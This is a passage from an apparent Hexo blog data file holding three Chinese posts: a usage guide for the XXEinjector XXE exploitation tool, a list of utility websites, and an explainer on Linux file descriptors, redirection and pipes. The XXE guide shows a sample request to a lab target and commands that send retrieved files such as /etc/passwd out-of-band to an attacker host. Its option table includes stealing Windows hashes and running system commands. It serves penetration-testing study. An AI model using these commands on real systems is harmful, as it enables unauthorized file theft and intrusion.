XXEinjector概述</h3><p>XXEinjector 是一款XXE Fuzz漏洞利用工具。</p>\n<p>XXEinjector 用于检索（爆破）存在XXE漏洞的目标服务器的文件或目录。</p>\n<p>XXEinjector 可以使用直接检索和带外的方式。</p>","more":"<p>XXEinjector 的目录遍历（<code>--path</code>）只能用于Java应用程序。其他类型的应用程序只能使用爆破（<code>--brute</code>）的方法。</p>\n<p>带外方式要求目标主机可以访问我们指定的主机（<code>--host</code>），因为采用带外方式时目标主机需要从我们指定的IP上获取恶意dtd文件，以及会将检索到的文件以FTP传输的方式传输到该IP上。（XXEinjector会自动运行WEB服务以及恶意dtd文件以及FTP服务器。）</p>\n<p>工具地址：<a href=\"https://github.com/enjoiz/XXEinjector\" target=\"_blank\" rel=\"noopener\">https://github.com/enjoiz/XXEinjector</a></p>\n<h3 id=\"0x01-基本重要参数使用方法\"><a href=\"#0x01-基本重要参数使用方法\" class=\"headerlink\" title=\"0x01 基本重要参数使用方法\"></a>0x01 基本重要参数使用方法</h3><p><code>--file</code>：这个参数是必选项，用于指定一个HTTP Request消息的文件。HTTP请求文件中要包含XML，或者可以使用”XXEINJECT”来标记注入点。</p>\n<blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; POST /pikachu/vul/xxe/xxe_1.php HTTP/1.1</span><br><span class=\"line\">&gt; Host: 192.168.199.111</span><br><span class=\"line\">&gt; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class=\"line\">&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">&gt; Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">&gt; Accept-Encoding: gzip, deflate</span><br><span class=\"line\">&gt; Referer: http://192.168.199.111/pikachu/vul/xxe/xxe_1.php</span><br><span class=\"line\">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">&gt; Content-Length: 30</span><br><span class=\"line\">&gt; Connection: close</span><br><span class=\"line\">&gt; Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; xml=XXEINJECT&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><code>--path</code>：指定要遍历的目录或文件。遍历目录只适用于Java应用程序。若是单一文件，则哪种程序都可以用。爆破文件则应使用参数<code>--brute</code>。</p>\n<blockquote>\n<p><code>--path=/etc</code></p>\n<p><code>--path=s://test.txt</code></p>\n</blockquote>\n<p><code>--brute</code>：该选项用于爆破文件，用于指定包含<code>文件路径</code>的字典文件。结果在<code>brute.log</code>文件中。</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; s://test.txt</span><br><span class=\"line\">&gt; s://test1.txt</span><br><span class=\"line\">&gt; /etc/passwd</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>工具包含直接和带外两种检索文件的方式。</strong></p>\n<p><strong>默认是带外方式：</strong></p>\n<p><code>--oob=ftp/http/gopher</code>：带外方式提供ftp(默认)、http、gopher三种协议。</p>\n<blockquote>\n<ul>\n<li>ftp协议适用于任意类型WEB程序。</li>\n<li>http、gopher协议只适用于Java &lt; 1.7的Java WEB应用程序。</li>\n</ul>\n</blockquote>\n<p><code>--host</code>：采用带外方式时，必选项。用于指定反连接IP。目标主机会从该IP获取恶意dtd文件，以及会将我们要获取的文件发到该IP的ftp上。</p>\n<p><code>--httpport</code>：<code>--host</code>指定的主机监听的WEB服务端口。默认80</p>\n<p><code>--ftpport</code>：<code>--host</code>指定的主机监听的FTP服务端口。默认21</p>\n<p><strong>直接方式</strong></p>\n<p><code>--direct</code>：表示采用直接方式。还需要用一个独特的字符串作为该参数的值，具体看参数解释。</p>\n<p><strong>其他参数：</strong></p>\n<p><code>--verbose</code>：显示详细信息，可以显示攻击数据包等。推荐使用。</p>\n<p><code>--phpfilter</code>：使用PHP filter对检索文件进行Base64编码。</p>\n<p><code>--ssl</code>：用于https站点。</p>\n<p><code>--expect</code>：使用 PHP expect 扩展执行系统命令。</p>\n<p><code>--output</code>：<code>--brute</code>输出结果保留的文件。</p>\n<h3 id=\"0x03-使用实例\"><a href=\"#0x03-使用实例\" class=\"headerlink\" title=\"0x03 使用实例\"></a>0x03 使用实例</h3><ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --path=s://test.txt --verbose --phpfilter</code></li>\n</ul>\n<blockquote>\n<p>结果在Logs\\IP\\目录下。</p>\n</blockquote>\n<ul>\n<li><code>ruby XXEinjector.rb --file=req.txt --host=192.168.1.1 --brute=filepath.txt --verbose --phpfilter --ssl</code></li>\n</ul>\n<blockquote>\n<p>结果在brute.log文件中。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--host\t    必选项 - our IP address for reverse connections. (--host=192.168.0.2)</span><br><span class=\"line\">--file\t    必选项 - 包含XML的HTTP Request文件。你也可以在请求文件中用&quot;XXEINJECT&quot;来标记的注入点。                      (--file=/tmp/req.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--path\t    如果要枚举目录，这是必选项 - 要枚举的目录路径。 (--path=/etc)</span><br><span class=\"line\">--brute\t    如果要枚举文件，这是必选项 - 包含要枚举的文件路径的字典文件。 (--brute=/tmp/brute.txt)</span><br><span class=\"line\">--logger    Log results only. Do not send requests. HTTP logger looks for &quot;p&quot; parameter with             results.</span><br><span class=\"line\">  </span><br><span class=\"line\">--rhost\t    目标主机的IP或者域名. 只有在Request文件中没用HOST头部时才使用. (--rhost=192.168.0.3)</span><br><span class=\"line\">--rport\t    目标主机的端口. 只有在Request文件中没用HOST头部时才使用，没有默认值. (--rport=8080)</span><br><span class=\"line\"></span><br><span class=\"line\">--oob\t    带外漏洞利用方法. FTP是默认的方法且FTP可以用于任意WEB程序中.HTTP只能用于爆破Java &lt; 1.7             的WEB程序的文件或目录. Gopher只能用于爆破Java &lt; 1.7的WEB程序的文件或目录. (--                     oob=http/ftp/gopher)</span><br><span class=\"line\"></span><br><span class=\"line\">--direct\t直接利用漏洞而不是带外方法. Unique mark should be specified as a value for this                 argument. This mark specifies where results of XXE start and end. Specify --xml               to see how XML in request file should look like. (--direct=UNIQUEMARK)</span><br><span class=\"line\"></span><br><span class=\"line\">--cdata\t    Improve direct exploitation with CDATA. Data is retrieved directly, however OOB               is used to construct CDATA payload. Specify --cdata-xml to see how request should             look like in this technique.</span><br><span class=\"line\"></span><br><span class=\"line\">--2ndfile\tFile containing valid HTTP request used in second order exploitation. </span><br><span class=\"line\">\t\t\t(--2ndfile=/tmp/2ndreq.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--phpfilter\t使用PHP filter对文件进行Base64编码.</span><br><span class=\"line\">--netdoc    使用netdoc协议而不是file协议。 (Java).</span><br><span class=\"line\">--enumports\tEnumerating unfiltered ports for reverse connection. Specify value &quot;all&quot; to     \t\t\tenumerate all TCP ports. (--enumports=21,22,80,443,445)</span><br><span class=\"line\"></span><br><span class=\"line\">--hashes\t窃取Windows哈希值.</span><br><span class=\"line\">--expect\t使用 PHP expect 扩展执行系统命令. (--expect=ls)</span><br><span class=\"line\">--upload\tUploads specified file using Java jar schema into temp file. (--                              upload=/tmp/upload.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--xslt\t    Tests for XSLT injection.</span><br><span class=\"line\"></span><br><span class=\"line\">--ssl\t    Use SSL.</span><br><span class=\"line\">--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)</span><br><span class=\"line\">--httpport\t   Set custom HTTP port. (--httpport=80)</span><br><span class=\"line\">--ftpport\t   Set custom FTP port. (--ftpport=21)</span><br><span class=\"line\">--gopherport   Set custom gopher port. (--gopherport=70)</span><br><span class=\"line\">--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)</span><br><span class=\"line\">--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)</span><br><span class=\"line\"></span><br><span class=\"line\">--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。</span><br><span class=\"line\"></span><br><span class=\"line\">--urlencode\tURL encode injected DTD. This is default for URI.</span><br><span class=\"line\">--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用&quot;--dtd&quot;可以看dtd              文件格式。</span><br><span class=\"line\"></span><br><span class=\"line\">--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中</span><br><span class=\"line\">\t\t\t(--output=/tmp/out.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--timeout\t    Timeout for receiving file/directory content. (--timeout=20)</span><br><span class=\"line\">--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)</span><br><span class=\"line\"></span><br><span class=\"line\">--fast\t    Skip asking what to enumerate. Prone to false-positives.</span><br><span class=\"line\">--verbose\t    Show verbose messages.</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-XXE学习资源\"><a href=\"#0x03-XXE学习资源\" class=\"headerlink\" title=\"0x03 XXE学习资源\"></a>0x03 XXE学习资源</h2><p><a href=\"https://nosec.org/home/detail/2139.html\" target=\"_blank\" rel=\"noopener\">https://nosec.org/home/detail/2139.html</a></p>"},{"title":"干货杂项收集","date":"2019-02-22T04:55:01.000Z","_content":"\n## 概述\n\n记录收集的一些有用、有趣的站点或工具软件。\n\n工具全绿色，坚决不用有广告的软件。\n\n<!-- more -->\n\n**装机必备软件**\n\n- 开源绿色压缩、解压软件：[Banzip](http://www.bandisoft.com/bandizip/)\n- 绿色版迅雷5\n\n**简洁干净搜索主页**\n\n- KIM：https://www.zhuye.kim/\n- 柠檬搜索：http://www.llemon.cn/  \n- 柴度搜索：https://www.chaidu.com/\n- 安全导航：https://www.shentoushi.top/\n\n**Win2Mac 桌面美化**\n\n- 酷鱼桌面\n- 软媒桌面\n- [upupoo](http://www.upupoo.com/)：动态壁纸桌面 + 追番（神器）  \n- Wallpaper Engine：Steam平台付费。\n\n**PPT等资源**\n\n- http://www.hippter.com/\n  - 收纳了众多PPT模板等素材的网站。\n\n**效率工具**\n\n- [everything](https://www.voidtools.com/zh-cn/)：本地文件全局快速搜索。\n- [Snipaste](https://www.snipaste.com/)：截图工具\n- [quicker](https://sspai.com/post/47776)：效率效率。\n\n**在线云手机验证码接收，防骚扰**\n\n- https://sms.cngrok.com/receiving-sms\n- http://www.smszk.com/\n- https://sms.cm/\n- 地址大合集：https://bbs.ichunqiu.com/thread-48282-1-1.html\n\n**在线工具**\n\n- 全能在线工具：https://www.toolnb.com/\n\n**杂项Misc**\n\n- [Typora](https://theme.typora.io/)：Markdown Editor\n- [小书匠](http://soft.xiaoshujiang.com/)：在线Markdown Editor。\n- [LICEcap](https://www.cockos.com/licecap/)：gif动图录制工具。\n- [MPic](http://mpic.lzhaofu.cn/)：图床。\n- [IPic](https://toolinbox.net/iPic/)：图床。\n- [PicGo](https://sspai.com/post/42310)：图床。","source":"_posts/干货杂项收集.md","raw":"---\ntitle: 干货杂项收集\ndate: 2019-02-22 12:55:01\ntags: \n  - 收集\n  - 干货\ncategories: Misc\n---\n\n## 概述\n\n记录收集的一些有用、有趣的站点或工具软件。\n\n工具全绿色，坚决不用有广告的软件。\n\n<!-- more -->\n\n**装机必备软件**\n\n- 开源绿色压缩、解压软件：[Banzip](http://www.bandisoft.com/bandizip/)\n- 绿色版迅雷5\n\n**简洁干净搜索主页**\n\n- KIM：https://www.zhuye.kim/\n- 柠檬搜索：http://www.llemon.cn/  \n- 柴度搜索：https://www.chaidu.com/\n- 安全导航：https://www.shentoushi.top/\n\n**Win2Mac 桌面美化**\n\n- 酷鱼桌面\n- 软媒桌面\n- [upupoo](http://www.upupoo.com/)：动态壁纸桌面 + 追番（神器）  \n- Wallpaper Engine：Steam平台付费。\n\n**PPT等资源**\n\n- http://www.hippter.com/\n  - 收纳了众多PPT模板等素材的网站。\n\n**效率工具**\n\n- [everything](https://www.voidtools.com/zh-cn/)：本地文件全局快速搜索。\n- [Snipaste](https://www.snipaste.com/)：截图工具\n- [quicker](https://sspai.com/post/47776)：效率效率。\n\n**在线云手机验证码接收，防骚扰**\n\n- https://sms.cngrok.com/receiving-sms\n- http://www.smszk.com/\n- https://sms.cm/\n- 地址大合集：https://bbs.ichunqiu.com/thread-48282-1-1.html\n\n**在线工具**\n\n- 全能在线工具：https://www.toolnb.com/\n\n**杂项Misc**\n\n- [Typora](https://theme.typora.io/)：Markdown Editor\n- [小书匠](http://soft.xiaoshujiang.com/)：在线Markdown Editor。\n- [LICEcap](https://www.cockos.com/licecap/)：gif动图录制工具。\n- [MPic](http://mpic.lzhaofu.cn/)：图床。\n- [IPic](https://toolinbox.net/iPic/)：图床。\n- [PicGo](https://sspai.com/post/42310)：图床。","slug":"干货杂项收集","published":1,"updated":"2019-03-01T09:16:06.109Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83la002y7or03bxyrw3j","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>记录收集的一些有用、有趣的站点或工具软件。</p>\n<p>工具全绿色，坚决不用有广告的软件。</p>\n<a id=\"more\"></a>\n<p><strong>装机必备软件</strong></p>\n<ul>\n<li>开源绿色压缩、解压软件：<a href=\"http://www.bandisoft.com/bandizip/\" target=\"_blank\" rel=\"noopener\">Banzip</a></li>\n<li>绿色版迅雷5</li>\n</ul>\n<p><strong>简洁干净搜索主页</strong></p>\n<ul>\n<li>KIM：<a href=\"https://www.zhuye.kim/\" target=\"_blank\" rel=\"noopener\">https://www.zhuye.kim/</a></li>\n<li>柠檬搜索：<a href=\"http://www.llemon.cn/\" target=\"_blank\" rel=\"noopener\">http://www.llemon.cn/</a>  </li>\n<li>柴度搜索：<a href=\"https://www.chaidu.com/\" target=\"_blank\" rel=\"noopener\">https://www.chaidu.com/</a></li>\n<li>安全导航：<a href=\"https://www.shentoushi.top/\" target=\"_blank\" rel=\"noopener\">https://www.shentoushi.top/</a></li>\n</ul>\n<p><strong>Win2Mac 桌面美化</strong></p>\n<ul>\n<li>酷鱼桌面</li>\n<li>软媒桌面</li>\n<li><a href=\"http://www.upupoo.com/\" target=\"_blank\" rel=\"noopener\">upupoo</a>：动态壁纸桌面 + 追番（神器）  </li>\n<li>Wallpaper Engine：Steam平台付费。</li>\n</ul>\n<p><strong>PPT等资源</strong></p>\n<ul>\n<li><a href=\"http://www.hippter.com/\" target=\"_blank\" rel=\"noopener\">http://www.hippter.com/</a><ul>\n<li>收纳了众多PPT模板等素材的网站。</li>\n</ul>\n</li>\n</ul>\n<p><strong>效率工具</strong></p>\n<ul>\n<li><a href=\"https://www.voidtools.com/zh-cn/\" target=\"_blank\" rel=\"noopener\">everything</a>：本地文件全局快速搜索。</li>\n<li><a href=\"https://www.snipaste.com/\" target=\"_blank\" rel=\"noopener\">Snipaste</a>：截图工具</li>\n<li><a href=\"https://sspai.com/post/47776\" target=\"_blank\" rel=\"noopener\">quicker</a>：效率效率。</li>\n</ul>\n<p><strong>在线云手机验证码接收，防骚扰</strong></p>\n<ul>\n<li><a href=\"https://sms.cngrok.com/receiving-sms\" target=\"_blank\" rel=\"noopener\">https://sms.cngrok.com/receiving-sms</a></li>\n<li><a href=\"http://www.smszk.com/\" target=\"_blank\" rel=\"noopener\">http://www.smszk.com/</a></li>\n<li><a href=\"https://sms.cm/\" target=\"_blank\" rel=\"noopener\">https://sms.cm/</a></li>\n<li>地址大合集：<a href=\"https://bbs.ichunqiu.com/thread-48282-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-48282-1-1.html</a></li>\n</ul>\n<p><strong>在线工具</strong></p>\n<ul>\n<li>全能在线工具：<a href=\"https://www.toolnb.com/\" target=\"_blank\" rel=\"noopener\">https://www.toolnb.com/</a></li>\n</ul>\n<p><strong>杂项Misc</strong></p>\n<ul>\n<li><a href=\"https://theme.typora.io/\" target=\"_blank\" rel=\"noopener\">Typora</a>：Markdown Editor</li>\n<li><a href=\"http://soft.xiaoshujiang.com/\" target=\"_blank\" rel=\"noopener\">小书匠</a>：在线Markdown Editor。</li>\n<li><a href=\"https://www.cockos.com/licecap/\" target=\"_blank\" rel=\"noopener\">LICEcap</a>：gif动图录制工具。</li>\n<li><a href=\"http://mpic.lzhaofu.cn/\" target=\"_blank\" rel=\"noopener\">MPic</a>：图床。</li>\n<li><a href=\"https://toolinbox.net/iPic/\" target=\"_blank\" rel=\"noopener\">IPic</a>：图床。</li>\n<li><a href=\"https://sspai.com/post/42310\" target=\"_blank\" rel=\"noopener\">PicGo</a>：图床。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>记录收集的一些有用、有趣的站点或工具软件。</p>\n<p>工具全绿色，坚决不用有广告的软件。</p>","more":"<p><strong>装机必备软件</strong></p>\n<ul>\n<li>开源绿色压缩、解压软件：<a href=\"http://www.bandisoft.com/bandizip/\" target=\"_blank\" rel=\"noopener\">Banzip</a></li>\n<li>绿色版迅雷5</li>\n</ul>\n<p><strong>简洁干净搜索主页</strong></p>\n<ul>\n<li>KIM：<a href=\"https://www.zhuye.kim/\" target=\"_blank\" rel=\"noopener\">https://www.zhuye.kim/</a></li>\n<li>柠檬搜索：<a href=\"http://www.llemon.cn/\" target=\"_blank\" rel=\"noopener\">http://www.llemon.cn/</a>  </li>\n<li>柴度搜索：<a href=\"https://www.chaidu.com/\" target=\"_blank\" rel=\"noopener\">https://www.chaidu.com/</a></li>\n<li>安全导航：<a href=\"https://www.shentoushi.top/\" target=\"_blank\" rel=\"noopener\">https://www.shentoushi.top/</a></li>\n</ul>\n<p><strong>Win2Mac 桌面美化</strong></p>\n<ul>\n<li>酷鱼桌面</li>\n<li>软媒桌面</li>\n<li><a href=\"http://www.upupoo.com/\" target=\"_blank\" rel=\"noopener\">upupoo</a>：动态壁纸桌面 + 追番（神器）  </li>\n<li>Wallpaper Engine：Steam平台付费。</li>\n</ul>\n<p><strong>PPT等资源</strong></p>\n<ul>\n<li><a href=\"http://www.hippter.com/\" target=\"_blank\" rel=\"noopener\">http://www.hippter.com/</a><ul>\n<li>收纳了众多PPT模板等素材的网站。</li>\n</ul>\n</li>\n</ul>\n<p><strong>效率工具</strong></p>\n<ul>\n<li><a href=\"https://www.voidtools.com/zh-cn/\" target=\"_blank\" rel=\"noopener\">everything</a>：本地文件全局快速搜索。</li>\n<li><a href=\"https://www.snipaste.com/\" target=\"_blank\" rel=\"noopener\">Snipaste</a>：截图工具</li>\n<li><a href=\"https://sspai.com/post/47776\" target=\"_blank\" rel=\"noopener\">quicker</a>：效率效率。</li>\n</ul>\n<p><strong>在线云手机验证码接收，防骚扰</strong></p>\n<ul>\n<li><a href=\"https://sms.cngrok.com/receiving-sms\" target=\"_blank\" rel=\"noopener\">https://sms.cngrok.com/receiving-sms</a></li>\n<li><a href=\"http://www.smszk.com/\" target=\"_blank\" rel=\"noopener\">http://www.smszk.com/</a></li>\n<li><a href=\"https://sms.cm/\" target=\"_blank\" rel=\"noopener\">https://sms.cm/</a></li>\n<li>地址大合集：<a href=\"https://bbs.ichunqiu.com/thread-48282-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-48282-1-1.html</a></li>\n</ul>\n<p><strong>在线工具</strong></p>\n<ul>\n<li>全能在线工具：<a href=\"https://www.toolnb.com/\" target=\"_blank\" rel=\"noopener\">https://www.toolnb.com/</a></li>\n</ul>\n<p><strong>杂项Misc</strong></p>\n<ul>\n<li><a href=\"https://theme.typora.io/\" target=\"_blank\" rel=\"noopener\">Typora</a>：Markdown Editor</li>\n<li><a href=\"http://soft.xiaoshujiang.com/\" target=\"_blank\" rel=\"noopener\">小书匠</a>：在线Markdown Editor。</li>\n<li><a href=\"https://www.cockos.com/licecap/\" target=\"_blank\" rel=\"noopener\">LICEcap</a>：gif动图录制工具。</li>\n<li><a href=\"http://mpic.lzhaofu.cn/\" target=\"_blank\" rel=\"noopener\">MPic</a>：图床。</li>\n<li><a href=\"https://toolinbox.net/iPic/\" target=\"_blank\" rel=\"noopener\">IPic</a>：图床。</li>\n<li><a href=\"https://sspai.com/post/42310\" target=\"_blank\" rel=\"noopener\">PicGo</a>：图床。</li>\n</ul>"},{"title":"文件描述符、重定向、管道浅析","date":"2019-03-29T06:56:20.000Z","_content":"\n### 0x00 前面的话\n\n以下只是自己的理解以及为了让自己容易去理解，并不保证完全正确性。\n\n### 0x01 重定向、文件描述符、管道\n\n**文件描述符**\n\n> 首先，Linux的哲学之一即一切皆文件。\n>\n> 其次，系统若要操作一个文件，就必须明确的指定这个文件，这就涉及到如何标识文件。我们标识文件使用的是文件名，但文件名只是为了用户可读性，但是计算机不同，计算机考虑的是性能而不是可读性。\n>\n> Linux使用文件描述符来标识一个文件，文件描述符实际是一个数字，不同的文件使用不同的数字来标识，Windows类似的是文件句柄。\n>\n> 在使用文件描述符时，直接使用会与真正的数字产生歧义，因此通过在数字之前使用`&`来标识该数字是文件描述符。\n\n<!-- more -->\n\n每个程序在运行前都会打开三个文件，分别是标准输入、标准输出、标准错误输出，文件描述符分别为0，1，2。\n\n> 我们把这三个文件当作三块内存空间，系统用0，1，2来标识这三块内存空间，程序从文件描述符为0的内存空间读取数据作为程序的输入，把程序输出的数据输出到文件描述符为1的内存空间中，把错误信息输出到文件描述符为2的内存空间中。\n\n简单说就是，程序在运行前会分配三块内存空间，然后分别标识为0，1，2，然后程序在运行时只管从标识符为0的内存读取数据，向标识符为0的内存输出数据，向标识符为2的内存输出错误信息。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329135059.png)\n\n两个问题：\n\n1. 不同的程序使用一样的0，1，2文件描述符来标识会导致混乱吗？\n\n   > 不用担心一样的标识会导致混乱，因为我们知道进程之间的内存空间是隔离独立的。\n\n2. 为什么要用三块内存作为中间区域，以及为什么都规定它们的文件描述符为0，1，2？\n\n   > 首先，采用中间区域的区域我想作用就是作为缓冲区。\n   >\n   > 其次，之所以都要使用0，1，2来标识，我觉得可以从用户的角度出发，用户只需要操作0，1，2这三个文件操作符接口就可以了，至于这三个内存区域绑定了哪个文件就交给操作系统了。假设，如果这个过程交给用户，那么用户想要把数据输出打印到屏幕上，那么首先得获取显示器对应的文件描述符，而把这个过程交给操作系统，然后操作系统提供一个接口（即0，1，2文件描述符）给用户使用，大大减小了用户的工作。\n\n**重定向**\n\n根据上面我们的理解可知，程序只管对标识符为0,1,2的内存空间进行操作。那么有几个问题，程序从标识符为0的内存空间中读取数据，那么谁又向该内存空间写入数据呢？总不可能凭空产生吧。程序向标识符为1的内存空间输出数据，那么谁又会从该内存空间读取并使用里面的数据呢？标准错误输出同理。\n\n为了解决上面的问题，这三块内存区域还应该与其他东西绑定，它们用于向这三块内存区域写入或读取数据。默认情况下，与标识符为0的内存空间绑定的标准输入设备就是键盘，与标识符为1的内存空间绑定的标准输出设备就是显示器，与标识符为2的内存空间绑定的标准错误输出设备也是显示器。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329135933.png)\n\n接下来我们回到这节的重点：重定向。\n\n重定向可以理解为更改这三块内存空间绑定的对象。\n\n> 输入重定向：`<`\n>\n> 输出重定向：`>`、`>>`\n>\n> 错误重定向：`2>`、`2>>`\n\n例如`cat test1.txt > test2.txt`，就是把标识符为1的内存空间绑定的对象从显示器更改为了文件。其他同理。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329140403.png)\n\n对于`0>&1`这种操作的理解：\n\n> 意思是将标识符为0的内存空间要绑定的对象改为标识符为1的内存空间**当前**绑定的对象。\n>\n> 注意，是当前的，意味是如果之后标识符为1的内存空间改变了绑定对象，并不会导致标识符为0的内存空间改变绑定对象。\n\n**管道**\n\n管道也可以理解为一块内存空间，这块内存空间绑定着前一个进程的标识符为1的内存空间以及后一个进程标识符为0的内存空间。即前一个进程输出的数据作为后一个进程的输入数据。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329142637.png)\n\n**参考资料：**\n\nhttps://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/\n\n","source":"_posts/文件描述符、重定向、管道浅析.md","raw":"---\ntitle: 文件描述符、重定向、管道浅析\ndate: 2019-03-29 14:56:20\ntags:\n\t- 文件描述符\n\t- 重定向\n\t- 管道\ncategories: Misc\n---\n\n### 0x00 前面的话\n\n以下只是自己的理解以及为了让自己容易去理解，并不保证完全正确性。\n\n### 0x01 重定向、文件描述符、管道\n\n**文件描述符**\n\n> 首先，Linux的哲学之一即一切皆文件。\n>\n> 其次，系统若要操作一个文件，就必须明确的指定这个文件，这就涉及到如何标识文件。我们标识文件使用的是文件名，但文件名只是为了用户可读性，但是计算机不同，计算机考虑的是性能而不是可读性。\n>\n> Linux使用文件描述符来标识一个文件，文件描述符实际是一个数字，不同的文件使用不同的数字来标识，Windows类似的是文件句柄。\n>\n> 在使用文件描述符时，直接使用会与真正的数字产生歧义，因此通过在数字之前使用`&`来标识该数字是文件描述符。\n\n<!-- more -->\n\n每个程序在运行前都会打开三个文件，分别是标准输入、标准输出、标准错误输出，文件描述符分别为0，1，2。\n\n> 我们把这三个文件当作三块内存空间，系统用0，1，2来标识这三块内存空间，程序从文件描述符为0的内存空间读取数据作为程序的输入，把程序输出的数据输出到文件描述符为1的内存空间中，把错误信息输出到文件描述符为2的内存空间中。\n\n简单说就是，程序在运行前会分配三块内存空间，然后分别标识为0，1，2，然后程序在运行时只管从标识符为0的内存读取数据，向标识符为0的内存输出数据，向标识符为2的内存输出错误信息。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329135059.png)\n\n两个问题：\n\n1. 不同的程序使用一样的0，1，2文件描述符来标识会导致混乱吗？\n\n   > 不用担心一样的标识会导致混乱，因为我们知道进程之间的内存空间是隔离独立的。\n\n2. 为什么要用三块内存作为中间区域，以及为什么都规定它们的文件描述符为0，1，2？\n\n   > 首先，采用中间区域的区域我想作用就是作为缓冲区。\n   >\n   > 其次，之所以都要使用0，1，2来标识，我觉得可以从用户的角度出发，用户只需要操作0，1，2这三个文件操作符接口就可以了，至于这三个内存区域绑定了哪个文件就交给操作系统了。假设，如果这个过程交给用户，那么用户想要把数据输出打印到屏幕上，那么首先得获取显示器对应的文件描述符，而把这个过程交给操作系统，然后操作系统提供一个接口（即0，1，2文件描述符）给用户使用，大大减小了用户的工作。\n\n**重定向**\n\n根据上面我们的理解可知，程序只管对标识符为0,1,2的内存空间进行操作。那么有几个问题，程序从标识符为0的内存空间中读取数据，那么谁又向该内存空间写入数据呢？总不可能凭空产生吧。程序向标识符为1的内存空间输出数据，那么谁又会从该内存空间读取并使用里面的数据呢？标准错误输出同理。\n\n为了解决上面的问题，这三块内存区域还应该与其他东西绑定，它们用于向这三块内存区域写入或读取数据。默认情况下，与标识符为0的内存空间绑定的标准输入设备就是键盘，与标识符为1的内存空间绑定的标准输出设备就是显示器，与标识符为2的内存空间绑定的标准错误输出设备也是显示器。\n\n![](文件描述符、重定向、管道浅析\\QQ截图20190329135933.png)\n\n接下来我们回到这节的重点：重定向。\n\n重定向可以理解为更改这三块内存空间绑定的对象。\n\n> 输入重定向：`<`\n>\n> 